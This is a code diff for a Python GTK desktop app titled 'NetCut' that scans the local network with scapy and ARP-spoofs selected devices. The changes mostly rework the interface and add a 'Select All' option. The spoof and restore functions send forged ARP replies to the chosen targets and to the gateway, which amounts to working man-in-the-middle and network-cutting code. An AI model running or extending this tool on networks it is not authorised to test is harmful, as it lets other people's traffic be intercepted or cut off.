@@ -17,7 +17,7 @@ import socket
 
 class NetworkTool(Adw.Application):
     def __init__(self):
-        super().__init__(application_id="com.example.NetworkTool")
+        super().__init__(application_id="com.example.NetworkTool", flags=Gio.ApplicationFlags.FLAGS_NONE)
         self.connect('activate', self.on_activate)
         self.is_scanning = False
         self.is_spoofing = False
@@ -47,7 +47,7 @@ class NetworkTool(Adw.Application):
 
     def update_status_label(self, message):
         if hasattr(self, 'status_label'):
-            self.status_label.set_text(f"Status: {message}")
+            self.status_label.set_text(f"{message}")
 
     def get_local_network(self):
         try:
@@ -78,7 +78,7 @@ class NetworkTool(Adw.Application):
 
     def on_activate(self, app):
         # Create the main window
-        self.window = Adw.ApplicationWindow(application=app, title="Network Tool")
+        self.window = Adw.ApplicationWindow(application=app, title="NetCut")
         self.window.set_default_size(600, 400)
 
         # Create the main box
@@ -90,13 +90,15 @@ class NetworkTool(Adw.Application):
         main_box.append(header)
 
         # Add refresh button to the header
-        self.refresh_button = Gtk.Button(icon_name="view-refresh-symbolic")
+        self.refresh_button = Gtk.Button.new_from_icon_name("view-refresh-symbolic")
+        self.refresh_button.add_css_class("flat")
         self.refresh_button.connect("clicked", self.on_refresh_clicked)
         header.pack_start(self.refresh_button)
 
         # Add hamburger menu
         menu_button = Gtk.MenuButton()
         menu_button.set_icon_name("open-menu-symbolic")
+        menu_button.add_css_class("flat")
         header.pack_end(menu_button)
 
         # Create a popover for the menu
@@ -132,65 +134,66 @@ class NetworkTool(Adw.Application):
         about_button.connect("clicked", self.on_about_clicked)
         popover_box.append(about_button)
 
-        # Create a content area
-        self.content_box = Gtk.Box(orientation=Gtk.Orientation.VERTICAL, spacing=12, margin_top=24, margin_bottom=24, margin_start=12, margin_end=12)
-        main_box.append(self.content_box)
+        # Create a content area with Clamp
+        content_clamp = Adw.Clamp()
+        content_clamp.set_maximum_size(800)
+        content_clamp.set_tightening_threshold(600)
+        main_box.append(content_clamp)
+
+        self.content_box = Gtk.Box(orientation=Gtk.Orientation.VERTICAL, spacing=24, margin_top=24, margin_bottom=24, margin_start=12, margin_end=12)
+        content_clamp.set_child(self.content_box)
 
         # Network info
         network_box = Adw.PreferencesGroup()
         self.content_box.append(network_box)
 
-        self.network_row = Adw.ActionRow(title="Network")
+        self.network_row = Adw.ActionRow(title="Network", icon_name="network-wired-symbolic")
         network_box.add(self.network_row)
 
-        self.gateway_row = Adw.ActionRow(title="Gateway")
+        self.gateway_row = Adw.ActionRow(title="Gateway", icon_name="network-server-symbolic")
         network_box.add(self.gateway_row)
 
         # Update network labels
         self.update_network_label()
 
         # Device list
-        device_box = Adw.PreferencesGroup(title="Devices")
-        self.content_box.append(device_box)
+        self.device_group = Adw.PreferencesGroup()
 
-        self.device_store = Gtk.ListStore(str, str, str, bool)
-        self.device_view = Gtk.TreeView(model=self.device_store)
-        
-        ip_renderer = Gtk.CellRendererText()
-        ip_column = Gtk.TreeViewColumn("IP", ip_renderer, text=0)
-        self.device_view.append_column(ip_column)
-
-        mac_renderer = Gtk.CellRendererText()
-        mac_column = Gtk.TreeViewColumn("MAC", mac_renderer, text=1)
-        self.device_view.append_column(mac_column)
-
-        hostname_renderer = Gtk.CellRendererText()
-        hostname_column = Gtk.TreeViewColumn("Hostname", hostname_renderer, text=2)
-        self.device_view.append_column(hostname_column)
-
-        spoof_renderer = Gtk.CellRendererToggle()
-        spoof_renderer.connect("toggled", self.on_spoof_toggled)
-        spoof_column = Gtk.TreeViewColumn("Spoof", spoof_renderer, active=3)
-        self.device_view.append_column(spoof_column)
-
+        # Wrap the device group in a scrolled window
         scrolled_window = Gtk.ScrolledWindow()
-        scrolled_window.set_vexpand(True)
-        scrolled_window.set_child(self.device_view)
-        device_box.add(scrolled_window)
+        scrolled_window.set_policy(Gtk.PolicyType.AUTOMATIC, Gtk.PolicyType.AUTOMATIC)
+        scrolled_window.set_min_content_height(200)  # Set minimum height for the scrolled window
+        scrolled_window.set_child(self.device_group)
+        self.content_box.append(scrolled_window)
 
-        # ARP spoofing section
-        spoof_box = Adw.PreferencesGroup(title="ARP Spoofing")
-        self.content_box.append(spoof_box)
+        # Add "Check All" checkbox to the group title
+        self.check_all_box = Gtk.Box(orientation=Gtk.Orientation.HORIZONTAL, spacing=6)
+        self.check_all_button = Gtk.CheckButton(label="Select All")
+        self.check_all_button.connect("toggled", self.on_check_all_toggled)
+        self.check_all_box.append(self.check_all_button)
 
-        spoof_row = Adw.ActionRow(title="ARP Spoofing")
-        self.spoof_button = Gtk.Button(label="Start Spoofing")
-        self.spoof_button.connect("clicked", self.on_spoof_clicked)
-        spoof_row.add_suffix(self.spoof_button)
-        spoof_box.add(spoof_row)
+        self.device_group.set_header_suffix(self.check_all_box)
+        self.check_all_box.set_visible(False)  # Initially hidden
+
+        # Loading spinner
+        self.spinner = Gtk.Spinner()
+        self.spinner.set_size_request(32, 32)
+        self.content_box.append(self.spinner)
 
         # Status label
         self.status_label = Gtk.Label(label="Status: Idle")
+        self.status_label.add_css_class('caption')
+        self.status_label.set_halign(Gtk.Align.CENTER)
         self.content_box.append(self.status_label)
+
+        # Add Pill button for spoofing
+        spoof_button_box = Gtk.Box(orientation=Gtk.Orientation.HORIZONTAL, halign=Gtk.Align.CENTER, margin_top=24, margin_bottom=12)
+        self.spoof_button = Gtk.Button(label="Start Spoofing")
+        self.spoof_button.add_css_class('pill')
+        self.spoof_button.add_css_class('suggested-action')
+        self.spoof_button.connect("clicked", self.on_spoof_clicked)
+        spoof_button_box.append(self.spoof_button)
+        self.content_box.append(spoof_button_box)
 
         self.window.present()
 
@@ -203,20 +206,35 @@ class NetworkTool(Adw.Application):
 
     def update_status_label(self, message):
         if hasattr(self, 'status_label'):
-            self.status_label.set_text(f"Status: {message}")
+            self.status_label.set_text(f"{message}")
 
     def on_thread_count_changed(self, spin_button):
         self.thread_count = spin_button.get_value_as_int()
         self.log_message(f"Thread count set to {self.thread_count}")
         self.popover.popdown()  # Close the popover after changing the thread count
 
-    def start_scan(self):
-        if not self.is_scanning and self.network:
-            self.is_scanning = True
-            self.log_message("Scanning network...")
-            threading.Thread(target=self.scan_network, daemon=True).start()
-        elif not self.network:
-            self.log_message("No network detected. Unable to scan.", logging.ERROR)
+    def on_about_clicked(self, button):
+        self.popover.popdown()  # Close the popover before opening the About dialog
+        about_dialog = Gtk.AboutDialog()
+        about_dialog.set_transient_for(self.window)
+        about_dialog.set_modal(True)
+
+        about_dialog.set_program_name("Network Tool")
+        about_dialog.set_version("1.0")
+        about_dialog.set_copyright("© 2023 Your Name")
+        about_dialog.set_comments("A network scanning and ARP spoofing tool.")
+        about_dialog.set_website("https://example.com")
+        about_dialog.set_website_label("Website")
+        about_dialog.set_authors(["Your Name"])
+        about_dialog.set_documenters(["Your Name"])
+        about_dialog.set_artists(["Your Name"])
+        about_dialog.set_license_type(Gtk.License.GPL_3_0)
+
+        about_dialog.connect("close-request", self.on_about_dialog_close)
+        about_dialog.present()
+
+    def on_about_dialog_close(self, dialog):
+        dialog.destroy()
 
     def on_refresh_clicked(self, button):
         # Update network and gateway information
@@ -229,25 +247,39 @@ class NetworkTool(Adw.Application):
         # Start the scan
         self.start_scan()
 
+    def start_scan(self):
+        if not self.is_scanning and self.network:
+            self.is_scanning = True
+            self.spinner.start()
+            self.log_message("Scanning network...")
+            threading.Thread(target=self.scan_network, daemon=True).start()
+        elif not self.network:
+            self.log_message("No network detected. Unable to scan.", logging.ERROR)
+
     def scan_network(self):
         try:
-            self.devices = []
+            new_devices = []
             # First, try ARP scan
-            self.arp_scan()
+            self.arp_scan(new_devices)
             
             # If ARP scan didn't find any devices, try ping scan
-            if not self.devices:
+            if not new_devices:
                 self.log_message("ARP scan found no devices. Trying ping scan...", logging.DEBUG)
-                self.ping_scan()
+                self.ping_scan(new_devices)
 
+            # Update self.devices
+            self.update_devices_list(new_devices)
+
+            # Update UI on the main thread
             GLib.idle_add(self.update_device_list)
         except Exception as e:
             self.log_message(f"Error during network scan: {str(e)}", logging.ERROR)
         finally:
             self.log_message(f"Scan completed. Found {len(self.devices)} devices.")
             self.is_scanning = False
+            GLib.idle_add(self.spinner.stop)
 
-    def arp_scan(self):
+    def arp_scan(self, devices):
         try:
             self.log_message(f"Starting ARP scan on network: {self.network}", logging.DEBUG)
             arp_request = scapy.ARP(pdst=self.network)
@@ -256,12 +288,12 @@ class NetworkTool(Adw.Application):
             answered_list = scapy.srp(arp_request_broadcast, timeout=3, verbose=False)[0]
             
             for element in answered_list:
-                self.devices.append({'ip': element[1].psrc, 'mac': element[1].hwsrc})
-            self.log_message(f"ARP scan completed. Found {len(self.devices)} devices.")
+                devices.append({'ip': element[1].psrc, 'mac': element[1].hwsrc})
+            self.log_message(f"ARP scan completed. Found {len(devices)} devices.")
         except Exception as e:
             self.log_message(f"ARP scan error: {e}", logging.ERROR)
 
-    def ping_scan(self):
+    def ping_scan(self, devices):
         try:
             self.log_message(f"Starting ping scan on network: {self.network}", logging.DEBUG)
             network = ipaddress.ip_network(self.network, strict=False)
@@ -272,9 +304,9 @@ class NetworkTool(Adw.Application):
                 for future in concurrent.futures.as_completed(futures):
                     result = future.result()
                     if result:
-                        self.devices.append(result)
+                        devices.append(result)
             
-            self.log_message(f"Ping scan completed. Found {len(self.devices)} devices.")
+            self.log_message(f"Ping scan completed. Found {len(devices)} devices.")
         except Exception as e:
             self.log_message(f"Ping scan error: {e}", logging.ERROR)
 
@@ -413,19 +445,68 @@ class NetworkTool(Adw.Application):
         return None
 
     def update_device_list(self):
-        self.device_store.clear()
+        # Clear existing rows
+        while True:
+            row = self.device_group.get_first_child()
+            if row is None:
+                break
+            if isinstance(row, Adw.ActionRow):
+                self.device_group.remove(row)
+            else:
+                break  # Stop if we encounter a non-ActionRow child
+
+        seen_ips = set()
         for device in self.devices:
-            self.device_store.append([device['ip'], device['mac'], device['hostname'], False])
+            if device['ip'] not in seen_ips:
+                seen_ips.add(device['ip'])
+                row = Adw.ActionRow(title=device['ip'], subtitle=f"{device['mac']} - {device.get('hostname', 'Unknown')}")
+                row.add_css_class('body')
+                check = Gtk.CheckButton()
+                check.set_active(device.get('spoof', False))
+                check.connect("toggled", self.on_device_check_toggled, device)
+                row.add_prefix(check)
+                self.device_group.add(row)
 
+        # Show or hide the "Check All" checkbox based on whether there are devices
+        self.check_all_box.set_visible(len(self.devices) > 0)
 
-    def on_spoof_toggled(self, widget, path):
-        self.device_store[path][3] = not self.device_store[path][3]
+        self.update_check_all_button()
+
+    def on_device_check_toggled(self, check, device):
+        device['spoof'] = check.get_active()
+        self.log_message(f"Device {device['ip']} spoofing set to {device['spoof']}")
+        self.update_check_all_button()
+
+    def on_check_all_toggled(self, button):
+        active = button.get_active()
+        for row in self.device_group:
+            if isinstance(row, Adw.ActionRow):
+                check = row.get_first_child()
+                if isinstance(check, Gtk.CheckButton):
+                    check.set_active(active)
+        
+        # Update all devices in self.devices
+        for device in self.devices:
+            device['spoof'] = active
+        
+        self.log_message(f"All devices set to {'spoof' if active else 'not spoof'}")
+
+    def update_check_all_button(self):
+        all_checked = all(device.get('spoof', False) for device in self.devices)
+        any_checked = any(device.get('spoof', False) for device in self.devices)
+        
+        self.check_all_button.handler_block_by_func(self.on_check_all_toggled)
+        self.check_all_button.set_active(all_checked)
+        self.check_all_button.set_inconsistent(any_checked and not all_checked)
+        self.check_all_button.handler_unblock_by_func(self.on_check_all_toggled)
 
     def on_spoof_clicked(self, button):
         if not self.is_spoofing:
             if self.gateway_ip:
                 self.is_spoofing = True
                 self.spoof_button.set_label("Stop Spoofing")
+                self.spoof_button.remove_css_class("suggested-action")
+                self.spoof_button.add_css_class("destructive-action")
                 self.log_message("Starting ARP spoofing...")
                 threading.Thread(target=self.spoof, daemon=True).start()
             else:
@@ -433,6 +514,8 @@ class NetworkTool(Adw.Application):
         else:
             self.is_spoofing = False
             self.spoof_button.set_label("Start Spoofing")
+            self.spoof_button.remove_css_class("destructive-action")
+            self.spoof_button.add_css_class("suggested-action")
             self.log_message("Stopping ARP spoofing...")
 
     def get_mac(self, ip):
@@ -448,10 +531,10 @@ class NetworkTool(Adw.Application):
             self.log_message(f"Gateway MAC: {gateway_mac}")
             
             while self.is_spoofing:
-                for row in self.device_store:
-                    if row[3]:  # If spoofing is enabled for this device
-                        target_ip = row[0]
-                        target_mac = row[1]
+                for device in self.devices:
+                    if device.get('spoof', False):
+                        target_ip = device['ip']
+                        target_mac = device['mac']
                         # Spoof target
                         scapy.send(scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=self.gateway_ip), verbose=False)
                         # Spoof gateway
@@ -466,10 +549,10 @@ class NetworkTool(Adw.Application):
     def restore_network(self):
         try:
             gateway_mac = self.get_mac(self.gateway_ip)
-            for row in self.device_store:
-                if row[3]:  # If spoofing was enabled for this device
-                    target_ip = row[0]
-                    target_mac = row[1]
+            for device in self.devices:
+                if device.get('spoof', False):
+                    target_ip = device['ip']
+                    target_mac = device['mac']
                     # Restore target
                     scapy.send(scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=self.gateway_ip, hwsrc=gateway_mac), count=4, verbose=False)
                     # Restore gateway
@@ -478,28 +561,21 @@ class NetworkTool(Adw.Application):
         except Exception as e:
             self.log_message(f"Error restoring network: {str(e)}", logging.ERROR)
 
-    def on_about_clicked(self, button):
-        self.popover.popdown()  # Close the popover before opening the About dialog
-        about_dialog = Gtk.AboutDialog()
-        about_dialog.set_transient_for(self.window)
-        about_dialog.set_modal(True)
-
-        about_dialog.set_program_name("Network Tool")
-        about_dialog.set_version("1.0")
-        about_dialog.set_copyright("© 2023 Your Name")
-        about_dialog.set_comments("A network scanning and ARP spoofing tool.")
-        about_dialog.set_website("https://example.com")
-        about_dialog.set_website_label("Website")
-        about_dialog.set_authors(["Your Name"])
-        about_dialog.set_documenters(["Your Name"])
-        about_dialog.set_artists(["Your Name"])
-        about_dialog.set_license_type(Gtk.License.GPL_3_0)
-
-        about_dialog.connect("close-request", self.on_about_dialog_close)
-        about_dialog.present()
-
-    def on_about_dialog_close(self, dialog):
-        dialog.destroy()
+    def update_devices_list(self, new_devices):
+        # Create a dictionary of existing devices with IP as the key
+        existing_devices = {device['ip']: device for device in self.devices}
+        
+        # Update existing devices and add new ones
+        for new_device in new_devices:
+            if new_device['ip'] in existing_devices:
+                # Update existing device
+                existing_devices[new_device['ip']].update(new_device)
+            else:
+                # Add new device
+                existing_devices[new_device['ip']] = new_device
+        
+        # Convert the dictionary back to a list
+        self.devices = list(existing_devices.values())
 
 if __name__ == "__main__":
     app = NetworkTool()
